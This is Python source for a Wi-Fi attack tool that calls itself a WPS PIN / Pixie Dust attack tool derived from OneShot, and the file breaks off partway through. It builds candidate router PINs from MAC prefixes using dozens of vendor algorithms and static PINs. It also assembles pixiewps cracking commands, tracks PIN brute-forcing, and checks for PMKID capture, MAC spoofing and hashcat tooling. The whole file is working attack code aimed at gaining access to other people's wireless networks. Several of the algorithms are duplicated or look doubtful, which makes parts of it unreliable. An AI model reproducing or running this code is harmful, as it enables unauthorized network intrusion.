#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Noyon.py — WPS PIN / Pixie Dust Attack Tool
# Author: NOYON BHAI
# Based on OneShotPin (c) 2017 rofl0r, modded by drygdryg
# Verified-Only Edition — no fake data
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import threading
from datetime import datetime
import collections
import statistics
import csv
import json
from pathlib import Path
from typing import Dict


# ═══════════════════════════════════════════════════════════════════
#  PREMIUM COLOR PALETTE
# ═══════════════════════════════════════════════════════════════════
class C:
    RESET     = '\033[0m'
    BOLD      = '\033[1m'
    DIM       = '\033[2m'
    ITALIC    = '\033[3m'
    UNDERLINE = '\033[4m'

    BLACK     = '\033[30m'
    RED       = '\033[91m'
    GREEN     = '\033[92m'
    YELLOW    = '\033[93m'
    BLUE      = '\033[94m'
    MAGENTA   = '\033[95m'
    CYAN      = '\033[96m'
    WHITE     = '\033[97m'

    B_RED     = '\033[1;91m'
    B_GREEN   = '\033[1;92m'
    B_YELLOW  = '\033[1;93m'
    B_BLUE    = '\033[1;94m'
    B_MAGENTA = '\033[1;95m'
    B_CYAN    = '\033[1;96m'
    B_WHITE   = '\033[1;97m'

    GOLD      = '\033[38;5;220m'
    ORANGE    = '\033[38;5;208m'
    PINK      = '\033[38;5;213m'
    GRAY      = '\033[38;5;245m'
    DARKGRAY  = '\033[38;5;240m'
    BG_DARK   = '\033[48;5;236m'


def clr(text, *styles):
    prefix = ''.join(styles)
    return f'{prefix}{text}{C.RESET}'


# ═══════════════════════════════════════════════════════════════════
#  MAC ADDRESS HELPER  (Fix #4: validation added)
# ═══════════════════════════════════════════════════════════════════
MAC_RE = re.compile(r'^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$')


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            if mac < 0 or mac > 0xFFFFFFFFFFFF:
                raise ValueError(f'MAC integer out of range: {mac}')
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            mac_clean = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac_clean)
            self._str_repr = self._int2mac(self._int_repr)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._int_repr = self._mac2int(value)
        self._str_repr = self._int2mac(self._int_repr)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        if value < 0 or value > 0xFFFFFFFFFFFF:
            raise ValueError(f'MAC integer out of range: {value}')
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer = self.integer + other
        return self

    def __isub__(self, other):
        self.integer = self.integer - other
        return self

    def __eq__(self, other):
        return isinstance(other, NetworkAddress) and self.integer == other.integer

    def __ne__(self, other):
        return not self.__eq__(other)

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    def __hash__(self):
        return hash(self.integer)

    @staticmethod
    def _mac2int(mac):
        # Validate strict 12-hex-digit form
        clean = mac.replace(':', '').replace('-', '').replace('.', '')
        if len(clean) != 12:
            raise ValueError(
                f'Invalid MAC address (expected 12 hex digits): {mac}')
        try:
            value = int(clean, 16)
        except ValueError:
            raise ValueError(f'Invalid MAC address (non-hex chars): {mac}')
        if value < 0 or value > 0xFFFFFFFFFFFF:
            raise ValueError(f'Invalid MAC address value: {mac}')
        return value

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i + 2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


# ═══════════════════════════════════════════════════════════════════
#  STRING HELPERS
# ═══════════════════════════════════════════════════════════════════
def _str_width(s):
    try:
        import wcwidth
        w = wcwidth.wcswidth(s)
        return w if w >= 0 else len(s)
    except Exception:
        return len(s)


def truncate(s, length, postfix='…'):
    original_width = _str_width(s)
    if original_width <= length:
        return s + ' ' * (length - original_width)
    postfix_width = _str_width(postfix)
    max_allowed = length - postfix_width
    current_width, truncated = 0, []
    for c in s:
        cw = _str_width(c)
        if current_width + cw > max_allowed:
            break
        truncated.append(c)
        current_width += cw
    result = ''.join(truncated)
    if len(truncated) < len(s):
        result += postfix
    return result + ' ' * max(0, length - _str_width(result))


# ═══════════════════════════════════════════════════════════════════
#  DEPENDENCY CHECK — SILENT BACKGROUND MODE
# ═══════════════════════════════════════════════════════════════════
_OPTIONAL_TOOLS = {
    'hcxdumptool':   False,
    'hcxpcapngtool': False,
    'macchanger':    False,
    'hashcat':       False,
}


def check_dependencies():
    global _OPTIONAL_TOOLS

    required = {
        'wpa_supplicant': 'wpasupplicant',
        'pixiewps':       'pixiewps',
        'iw':             'iw',
        'ip':             'iproute2',
    }
    optional = {
        'hcxdumptool':   'PMKID attack',
        'hcxpcapngtool': 'PMKID hash conversion',
        'macchanger':    'MAC spoofing',
        'hashcat':       'Password cracking',
    }

    missing = []
    for cmd, pkg in required.items():
        if not shutil.which(cmd):
            missing.append(f'{cmd} ({pkg})')

    if missing:
        die('Missing required tools: ' + ', '.join(missing) +
            '\nInstall: apt install ' + ' '.join(
                p.split('(')[1].strip(')') for p in missing))

    for cmd in optional:
        _OPTIONAL_TOOLS[cmd] = shutil.which(cmd) is not None


# ═══════════════════════════════════════════════════════════════════
#  WPS PIN GENERATOR
# ═══════════════════════════════════════════════════════════════════
class WPSpin:
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {
            # ── Basic MAC-derived ──
            'pin24':       {'name': '24-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin24},
            'pin28':       {'name': '28-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin28},
            'pin32':       {'name': '32-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin32},
            'pinDLink':    {'name': 'D-Link PIN',       'mode': self.ALGO_MAC,    'gen': self.pinDLink},
            'pinDLink1':   {'name': 'D-Link PIN +1',    'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
            'pinASUS':     {'name': 'ASUS PIN',         'mode': self.ALGO_MAC,    'gen': self.pinASUS},
            'pinAirocon':  {'name': 'Airocon Realtek',  'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
            'pinBelkin':   {'name': 'Belkin (Stas\'M)', 'mode': self.ALGO_MAC,    'gen': self.pinBelkin},
            'pinArcadyan': {'name': 'Arcadyan',         'mode': self.ALGO_MAC,    'gen': self.pinArcadyan},
            'pinZhao':     {'name': 'Zhao Chesung',     'mode': self.ALGO_MAC,    'gen': self.pinZhao},
            'pinTrendNet': {'name': 'TrendNet',         'mode': self.ALGO_MAC,    'gen': self.pinTrendNet},

            # ── Extended MAC widths ──
            'pin36':       {'name': '36-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin36},
            'pin40':       {'name': '40-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin40},
            'pin44':       {'name': '44-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin44},
            'pin48':       {'name': '48-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin48},

            # ── Reverse byte ──
            'pin24rh':     {'name': 'Rev-Byte 24-bit',  'mode': self.ALGO_MAC,    'gen': self.pin24rh},
            'pin32rh':     {'name': 'Rev-Byte 32-bit',  'mode': self.ALGO_MAC,    'gen': self.pin32rh},
            'pin48rh':     {'name': 'Rev-Byte 48-bit',  'mode': self.ALGO_MAC,    'gen': self.pin48rh},

            # ── Reverse nibble ──
            'pin24rn':     {'name': 'Rev-Nibble 24-bit','mode': self.ALGO_MAC,    'gen': self.pin24rn},
            'pin32rn':     {'name': 'Rev-Nibble 32-bit','mode': self.ALGO_MAC,    'gen': self.pin32rn},
            'pin48rn':     {'name': 'Rev-Nibble 48-bit','mode': self.ALGO_MAC,    'gen': self.pin48rn},

            # ── Reverse bits ──
            'pin24rb':     {'name': 'Rev-Bits 24-bit',  'mode': self.ALGO_MAC,    'gen': self.pin24rb},
            'pin32rb':     {'name': 'Rev-Bits 32-bit',  'mode': self.ALGO_MAC,    'gen': self.pin32rb},
            'pin48rb':     {'name': 'Rev-Bits 48-bit',  'mode': self.ALGO_MAC,    'gen': self.pin48rb},

            # ── NIC arithmetic ──
            'pinInvNIC':   {'name': 'INV NIC',          'mode': self.ALGO_MAC,    'gen': self.pinInvNIC},
            'pinNICx2':    {'name': 'NIC × 2',          'mode': self.ALGO_MAC,    'gen': self.pinNICx2},
            'pinNICx3':    {'name': 'NIC × 3',          'mode': self.ALGO_MAC,    'gen': self.pinNICx3},

            # ── OUI/NIC operations ──
            'pinOUIaddNIC': {'name': 'OUI + NIC',       'mode': self.ALGO_MAC,    'gen': self.pinOUIaddNIC},
            'pinOUIsubNIC': {'name': 'OUI − NIC',       'mode': self.ALGO_MAC,    'gen': self.pinOUIsubNIC},
            'pinOUIxorNIC': {'name': 'OUI ⊕ NIC',       'mode': self.ALGO_MAC,    'gen': self.pinOUIxorNIC},

            # ── Empty + static pins ──
            'pinEmpty':    {'name': 'Empty PIN',        'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
            'pinCisco':    {'name': 'Cisco',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1':    {'name': 'Broadcom 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2':    {'name': 'Broadcom 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3':    {'name': 'Broadcom 3',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4':    {'name': 'Broadcom 4',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5':    {'name': 'Broadcom 5',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6':    {'name': 'Broadcom 6',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1':    {'name': 'Airocon 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2':    {'name': 'Airocon 2',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel':    {'name': 'Upvel',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC':  {'name': 'UR-814AC',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC':  {'name': 'UR-825AC',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime':   {'name': 'Onlime',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax':   {'name': 'Edimax',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson':  {'name': 'Thomson',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x':   {'name': 'HG532x',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L':    {'name': 'H108L',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO':      {'name': 'CBN ONO',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
            'pin2Wire':    {'name': '2Wire (CVE-2012-4366)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1223330},
            'pinArris':    {'name': 'Arris (Advisory)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 8822885},
        }

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append({
                'id': ID,
                'name': ('Static PIN — ' + algo['name'])
                        if algo['mode'] == self.ALGO_STATIC else algo['name'],
                'pin': self.generate(ID, mac),
            })
        return res

    def getList(self, mac, get_static=True):
        return [self.generate(ID, mac)
                for ID, algo in self.algos.items()
                if not (algo['mode'] == self.ALGO_STATIC and not get_static)]

    def getSuggested(self, mac):
        return [{
            'id': ID,
            'name': ('Static PIN — ' + self.algos[ID]['name'])
                    if self.algos[ID]['mode'] == self.ALGO_STATIC
                    else self.algos[ID]['name'],
            'pin': self.generate(ID, mac),
        } for ID in self._suggest(mac)]

    def getSuggestedList(self, mac):
        return [self.generate(algo, mac) for algo in self._suggest(mac)]

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        return res[0] if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': (
                '04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D',
                '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB',
                '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E',
                'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC',
                'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5',
                '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D',
                '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE',
                '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30',
                'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091',
                '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35',
                '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401',
                '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF',
                '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4',
                '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE',
                '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4',
                '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F',
                '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167',
                '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C',
                '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F',
                '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE',
                '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D',
                'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026',
                'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A',
                'B4944E',
                '001D0F', '002127', '0023CD', '0024B2', '002719', '105172',
                '147CB8', '18909F', '349672', '3C6A2A', '403F8C', '485D60',
                '503CC8', '5465F3', '60E32B', '645299', '74EA3A', '8481F4',
                '90671C', '989ECE', 'A42B8C', 'AC15A2', 'B0BE76', 'C025E9',
                'C005C2', 'CC2D8C', 'D807B6', 'E4D3F1', 'E8DE27', 'EC086B',
                'F483CD', '18A6F7', '3C46D8', '60E327', '704F57', '7C8BCA',
                '90F652', 'C074AD', 'CE3D82', 'DC028E', '1027F5', '1C61B4',
                '30DE4B', '54AF97', '68FF7B', '98DAC4', '9C5322', 'B09575',
                'CC81DA', 'E4C32A', '000AEB', '000C43', '001333', '001839',
                '001A2F', '001B2F', '001E2A', '00223F', '002586', '003192',
                '14CC20', '841630',
                '000B00', '502B73', '50642B', '5C3A5A', '640980', '6891F4',
                '7085C2', '786427', '78F8A1', '80D0B5', '8891DD', '989E77',
                '9C9D7E', 'ACF832', 'B83A3A', 'C42335', 'C46AB7', 'D8322E',
                'E03676', 'E47185', 'F0B429', '14CF92', '288088', '58D56E',
                '8C68C8', '94A7B7', '44946F', '1013EE', '1C3BF3', '503FA4',
                'AC84C6', 'C46E1F', 'D847A7', 'E894F6', 'F4F26D',
                '2CA542', 'AC15A2', '10DA43', '687251', '983BDD',
                '34CE00', '50EC50', 'F8A45F', 'A4DA22', 'D4970B',
                '002598', '283152', '781DBA', 'E0247F', '3CDFBD',
                'E091F5', '9C3DCF', '44944A',
            ),
            'pin28': (
                '200BC7', '4846FB', 'D46AA8', 'F84ABF',
                '0C8268', '1C5F2B', '2CAB25', '48EE0C', '6C7220',
                '78542E', '803F5D', '88A6C6', '94A7B7', 'A01B29',
                'B0BE76', 'C891F9', 'E4BEED', 'EC4C4D', '1062EB',
            ),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B',
                      '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25',
                      '10BF48', '14DAE9', '3085A9', '50465D', '5404A6',
                      'C86000', 'F46D04', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B',
                         'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1',
                         'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191',
                          '0022B0', '002401', '00265A', '14D64D', '1C7EE5',
                          '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19',
                          'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '107B44', '10BF48',
                        '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC',
                        '2CFDA1', '305A3A', '382C4A', '38D547', '40167E',
                        '50465D', '54A050', '6045CB', '60A44C', '704D7B',
                        '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B',
                        'AC9E17', 'B06EBF', 'BCEE7B', 'D017C2', 'D850E6',
                        'E03F49', 'F832E4', '000726', '0008A1', '00177C',
                        '001EA6', '048D38', '081077', '081078', '081079',
                        '083E5D', '181E78', '1C4419', '2420C7', '247F20',
                        '2CAB25', '3C1E04', '40F201', '44E9DD', '48EE0C',
                        '5464D9', '54B80A', '64517E', '64D954', '6C198F',
                        '6C7220', '6CFDB9', '7C2664', '84A423', '88A6C6',
                        '8C10D4', '904D4A', '907282', '94FBB2', 'A01B29',
                        'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680',
                        'C891F9', 'D084B0', 'D8FEE3', 'E4BEED', 'EC4C4D',
                        'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97',
                        '7062B8', '78542E', 'C412F5', 'C4A81D', 'E8CC18',
                        'EC2280'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B',
                           '00177C', '001AEF', '00E04BB3', '02101801',
                           '0810734', '08107710', '1013EE0', '2CAB25C7',
                           '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61',
                           'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5',
                         '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643',
                         '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E',
                         '000E8F', 'D42122', '3C9872', '788102', '7894B4',
                         'D460E3', 'E06066', '004A77', '2C957F', '64136C',
                         '74A78E', '88D274', '702E22', '74B57E', '789682',
                         '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F',
                         '54BE53', '709F2D', '94A7B7', '981333', 'CAA366',
                         'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC',
                         'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9',
                         '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386',
                         'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685',
                         'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386',
                         'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516',
                         '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386',
                         'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516',
                         '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386',
                         'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516',
                         '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2',
                            'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968',
                          '2008ED', '2469A5', '346BD3', '786A89', '88E3AB',
                          '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D',
                          'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5',
                         'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C'),
            'pinBelkin':  ('001CDF', '002275', '08863B', '00B00C', '081075',
                           '94103E', '944452', 'B4750E', 'C05627', 'EC1A59'),
            'pinArcadyan': ('001A2B', '00248C', '002618', '344DEB', '7071BC',
                            'E06995', 'E0CB4E', '7054F5', 'D46E5C'),
            'pinZhao':    ('C83A35', '00B00C', '081075', '001CDF', '002275',
                           '08863B'),
            'pinTrendNet': ('0014D1', '000C42', '000EE8', '00E04C'),
            'pin36':  (),
            'pin40':  (),
            'pin44':  (),
            'pin48':  (),
            'pin24rh': (),
            'pin32rh': (),
            'pin48rh': (),
            'pin24rn': (),
            'pin32rn': (),
            'pin48rn': (),
            'pin24rb': (),
            'pin32rb': (),
            'pin48rb': (),
            'pinInvNIC': (),
            'pinNICx2': (),
            'pinNICx3': (),
            'pinOUIaddNIC': (),
            'pinOUIsubNIC': (),
            'pinOUIxorNIC': (),
        }
        res = []
        for algo_id, masks in algorithms.items():
            if not masks:
                continue
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    # ── Basic MAC-derived algorithms ──
    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer = mac.integer + 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) %
                       (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin) if pin else 0

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return ((b[0] + b[1]) % 10) \
             + (((b[5] + b[0]) % 10) * 10) \
             + (((b[4] + b[5]) % 10) * 100) \
             + (((b[3] + b[4]) % 10) * 1000) \
             + (((b[2] + b[3]) % 10) * 10000) \
             + (((b[1] + b[2]) % 10) * 100000) \
             + (((b[0] + b[1]) % 10) * 1000000)

    def pinBelkin(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinArcadyan(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return ((b[0] + b[1]) % 10) \
             + (((b[5] + b[0]) % 10) * 10) \
             + (((b[4] + b[5]) % 10) * 100) \
             + (((b[3] + b[4]) % 10) * 1000) \
             + (((b[2] + b[3]) % 10) * 10000) \
             + (((b[1] + b[2]) % 10) * 100000) \
             + (((b[0] + b[1]) % 10) * 1000000)

    def pinZhao(self, mac):
        nic = mac.integer & 0xFFFFFF
        return nic % 10000000

    def pinTrendNet(self, mac):
        nic = mac.integer & 0xFFFFFF
        return nic % 10000000

    # ── Extended MAC widths ──
    def pin36(self, mac):
        return mac.integer & 0xFFFFFFFFF

    def pin40(self, mac):
        return mac.integer & 0xFFFFFFFFFF

    def pin44(self, mac):
        return mac.integer & 0xFFFFFFFFFFF

    def pin48(self, mac):
        return mac.integer & 0xFFFFFFFFFFFF

    # ── Reverse byte ──
    def pin24rh(self, mac):
        nic = mac.integer & 0xFFFFFF
        result = 0
        for i in range(3):
            byte = (nic >> (i * 8)) & 0xFF
            result |= byte << ((2 - i) * 8)
        return result

    def pin32rh(self, mac):
        val = mac.integer & 0xFFFFFFFF
        result = 0
        for i in range(4):
            byte = (val >> (i * 8)) & 0xFF
            result |= byte << ((3 - i) * 8)
        return result

    def pin48rh(self, mac):
        result = 0
        for i in range(6):
            byte = (mac.integer >> (i * 8)) & 0xFF
            result |= byte << ((5 - i) * 8)
        return result

    # ── Reverse nibble ──
    def pin24rn(self, mac):
        nic = mac.integer & 0xFFFFFF
        s = f'{nic:06X}'
        return int(s[::-1], 16)

    def pin32rn(self, mac):
        val = mac.integer & 0xFFFFFFFF
        s = f'{val:08X}'
        return int(s[::-1], 16)

    def pin48rn(self, mac):
        s = f'{mac.integer:012X}'
        return int(s[::-1], 16)

    # ── Reverse bits ──
    def pin24rb(self, mac):
        nic = mac.integer & 0xFFFFFF
        return int(f'{nic:024b}'[::-1], 2)

    def pin32rb(self, mac):
        val = mac.integer & 0xFFFFFFFF
        return int(f'{val:032b}'[::-1], 2)

    def pin48rb(self, mac):
        return int(f'{mac.integer:048b}'[::-1], 2)

    # ── NIC arithmetic ──
    def pinInvNIC(self, mac):
        return (~mac.integer) & 0xFFFFFF

    def pinNICx2(self, mac):
        return (mac.integer & 0xFFFFFF) * 2

    def pinNICx3(self, mac):
        return (mac.integer & 0xFFFFFF) * 3

    # ── OUI/NIC operations ──
    def pinOUIaddNIC(self, mac):
        oui = mac.integer >> 24
        nic = mac.integer & 0xFFFFFF
        return (oui + nic) & 0xFFFFFF

    def pinOUIsubNIC(self, mac):
        oui = mac.integer >> 24
        nic = mac.integer & 0xFFFFFF
        return (oui - nic) & 0xFFFFFF

    def pinOUIxorNIC(self, mac):
        oui = mac.integer >> 24
        nic = mac.integer & 0xFFFFFF
        return oui ^ nic


# ═══════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════
def get_hex(line):
    parts = line.split(':', 3)
    if len(parts) < 3:
        return ''
    return parts[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = self.pkr = self.e_hash1 = ''
        self.e_hash2 = self.authkey = self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce
                and self.authkey and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        cmd = ('pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} '
               '--authkey {} --e-nonce {}').format(
                   self.pke, self.pkr, self.e_hash1,
                   self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            cmd += ' --force'
        return cmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    # ── Fix #2: mask length/format check ──
    def display_status(self):
        if not self.attempts_times:
            return
        try:
            average_pin_time = statistics.mean(self.attempts_times)
        except statistics.StatisticsError:
            return
        try:
            if len(self.mask) == 4:
                percentage = int(self.mask) / 11000 * 100
            elif len(self.mask) == 7:
                percentage = ((10000 / 11000) +
                              (int(self.mask[4:]) / 11000)) * 100
            else:
                return
        except (ValueError, IndexError):
